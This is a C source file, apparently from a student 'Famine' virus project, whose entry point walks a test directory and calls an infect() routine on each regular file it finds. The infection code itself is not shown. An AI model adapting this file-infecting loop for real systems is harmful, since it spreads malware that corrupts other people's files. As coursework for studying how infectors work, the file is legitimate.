/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: nguiard <nguiard@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2024/09/09 03:01:26 by nguiard           #+#    #+#             */
/*   Updated: 2024/10/31 11:55:02 by nguiard          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"

#define BUFF_SIZE 0x1000

void _start() {
	int64_t		ret = 0;
	uint64_t	fd;
	byte		buff[BUFF_SIZE];
	str			directories[] = {"exemple", NULL};
	char		max_path[513];
	dirent		*d;

	for (int dir_index = 0; directories[dir_index]; dir_index++) {
		size_t len_dir = ft_strlen(directories[dir_index]);
		
		for (size_t i = 0; i < len_dir; i++)
			max_path[i] = directories[dir_index][i];
		max_path[len_dir] = '/';

		open(fd, directories[dir_index], O_RDONLY);	

		getdents(ret, fd, buff, BUFF_SIZE);
		if (ret < 0)
			printf(FILE_LINE("gedents() \033[31mfail:\033[0m %ld\n"), ret);

		while (ret > 0) {
			int64_t	d_offset = 0;

			while (d_offset < ret) {
				byte	d_type;

				d = (dirent *)((uint64_t)(buff) + d_offset);
				d_type = buff[d_offset + d->d_reclen - 1];

				if (d_type == DT_REG) {
					size_t	file_size = ft_strlen(d->d_name);

					for (size_t i = len_dir + 1; i < 513; i++)
						max_path[i] = 0;
					
					for (size_t i = 0; i < file_size; i++)
						max_path[len_dir + 1 + i] = d->d_name[i];

					printf("[%s]\n", max_path);

					infect(max_path);
				}

				d_offset += d->d_reclen;
			}

			getdents(ret, fd, buff, BUFF_SIZE);
			if (ret < 0)
				printf(FILE_LINE("gedents() \033[31mfail:\033[0m %ld\n"), ret);
		}

		for (size_t i = 0; i < len_dir + 1; i++)
			max_path[i] = 0;
	}

	fflush(stdout);
	
	exit(0);
}

size_t	ft_strlen(str buff) {
	size_t	index = 0;

	while (buff[index])
		index++;

	return index;
}

